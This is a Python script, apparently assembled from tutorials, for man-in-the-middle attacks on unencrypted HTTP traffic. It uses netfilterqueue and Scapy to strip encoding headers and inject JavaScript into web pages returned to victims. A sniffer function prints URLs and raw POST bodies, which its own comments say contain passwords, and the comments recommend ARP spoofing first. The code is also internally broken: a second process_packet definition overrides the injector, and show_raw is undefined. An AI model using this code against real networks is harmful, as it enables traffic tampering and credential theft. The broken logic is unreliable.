from scapy.all import *
from scapy.layers.http import HTTPRequest # import HTTP packet
from colorama import init, Fore
import netfilterqueue
import re
# initialize colorama
init()
# define colors
GREEN = Fore.GREEN
RED = Fore.RED
RESET = Fore.RESET

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    # convert the netfilterqueue packet into Scapy packet
    spacket = IP(packet.get_payload())
    if spacket.haslayer(Raw) and spacket.haslayer(TCP):
        if spacket[TCP].dport == 80:
            # HTTP request
            print(f"[*] Detected HTTP Request from {spacket[IP].src} to {spacket[IP].dst}")
            try:
                load = spacket[Raw].load.decode()
            except Exception as e:
                # raw data cannot be decoded, apparently not HTML
                # forward the packet exit the function
                packet.accept()
                return
            # remove Accept-Encoding header from the HTTP request
            new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
            # set the new data
            spacket[Raw].load = new_load
            # set IP length header, checksums of IP and TCP to None
            # so Scapy will re-calculate them automatically
            spacket[IP].len = None
            spacket[IP].chksum = None
            spacket[TCP].chksum = None
            # set the modified Scapy packet back to the netfilterqueue packet
            packet.set_payload(bytes(spacket))
        if spacket[TCP].sport == 80:
                # HTTP response
                print(f"[*] Detected HTTP Response from {spacket[IP].src} to {spacket[IP].dst}")
                try:
                    load = spacket[Raw].load.decode()
                except:
                    packet.accept()
                    return
                # if you want to debug and see the HTML data
                # print("Load:", load)
                # Javascript code to add, feel free to add any Javascript code
                added_text = "<script>alert('Javascript Injected successfully!');</script>"
                # or you can add HTML as well!
                # added_text = "<p><b>HTML Injected successfully!</b></p>"
                # calculate the length in bytes, each character corresponds to a byte
                added_text_length = len(added_text)
                # replace the </body> tag with the added text plus </body>
                load = load.replace("</body>", added_text + "</body>")
                if "Content-Length" in load:
                    # if Content-Length header is available
                    # get the old Content-Length value
                    content_length = int(re.search(r"Content-Length: (\d+)\r\n", load).group(1))
                    # re-calculate the content length by adding the length of the injected code
                    new_content_length = content_length + added_text_length
                    # replace the new content length to the header
                    load = re.sub(r"Content-Length:.*\r\n", f"Content-Length: {new_content_length}\r\n", load)
                    # print a message if injected
                    if added_text in load:
                        print(f"{GREEN}[+] Successfully injected code to {spacket[IP].dst}{RESET}")
                # if you want to debug and see the modified HTML data
                # print("Load:", load)
                # set the new data
                spacket[Raw].load = load
                # set IP length header, checksums of IP and TCP to None
                # so Scapy will re-calculate them automatically
                spacket[IP].len = None
                spacket[IP].chksum = None
                spacket[TCP].chksum = None
                # set the modified Scapy packet back to the netfilterqueue packet
                packet.set_payload(bytes(spacket))
        # accept all the packets
        packet.accept()


def sniff_packets(iface=None):
    """
    Sniff 80 port packets with `iface`, if None (default), then the
    Scapy's default interface is used
    """
    if iface:
        # port 80 for http (generally)
        # `process_packet` is the callback
        sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
    else:
        # sniff with default interface
        sniff(filter="port 80", prn=process_packet, store=False)

def process_packet(packet):
    """
    This function is executed whenever a packet is sniffed
    """
    if packet.haslayer(HTTPRequest):
        # if this packet is an HTTP Request
        # get the requested URL
        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
        # get the requester's IP Address
        ip = packet[IP].src
        # get the request method
        method = packet[HTTPRequest].Method.decode()
        print(f"\n{GREEN}[+] {ip} Requested {url} with {method}{RESET}")
        if show_raw and packet.haslayer(Raw) and method == "POST":
            # if show_raw flag is enabled, has raw data, and the requested method is "POST"
            # then show raw
            print(f"\n{RED}[*] Some useful Raw data: {packet[Raw].load}{RESET}")


# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    # import argparse
    #
    # parser = argparse.ArgumentParser(description="HTTP Packet Sniffer, this is useful when you're a man in the middle." \
    #                                              + "It is suggested that you run arp spoof before you use this script, otherwise it'll sniff your personal packets")
    # parser.add_argument("-i", "--iface", help="Interface to use, default is scapy's default interface")
    # parser.add_argument("--show-raw", dest="show_raw", action="store_true",
    #                     help="Whether to print POST raw data, such as passwords, search queries, etc.")
    # # parse arguments
    # args = parser.parse_args()
    # iface = args.iface
    # show_raw = args.show_raw
    # sniff_packets(iface)
        # initialize the queue
        queue = netfilterqueue.NetfilterQueue()
        # bind the queue number 0 to the process_packet() function
        queue.bind(0, process_packet)
        # start the filter queue
        queue.run()

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
